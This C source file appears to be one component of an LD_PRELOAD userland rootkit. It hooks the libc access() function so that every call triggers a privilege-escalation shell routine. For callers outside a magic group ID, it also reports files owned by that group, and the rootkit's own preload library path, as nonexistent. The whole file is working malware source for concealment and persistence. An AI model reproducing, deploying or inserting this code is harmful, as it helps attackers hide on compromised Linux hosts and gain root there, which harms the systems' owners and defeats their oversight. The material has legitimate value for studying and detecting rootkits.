#include "father.h"

/*
 * access() hook to check magic GID, STRING, and PRELOAD location. Return NOENT
 * if found
 */
int (*o_access)(const char *, int mode);
int access(const char *pathname, int mode) {

#ifdef DEBUG
  fprintf(stderr, "access() called!\n");
#endif

  lpe_drop_shell();

  if (!o_access)
    o_access = dlsym(RTLD_NEXT, "access");

  if (getegid() == GID)
    return o_access(pathname, mode);

  struct stat s_buf;

  memset(&s_buf, 0, sizeof(struct stat));

  __lxstat(_STAT_VER, pathname, &s_buf);

  if (s_buf.st_gid == GID || strstr(pathname, PRELOAD)) {
    errno = ENOENT;
    return -1;
  }

  return o_access(pathname, mode);
}
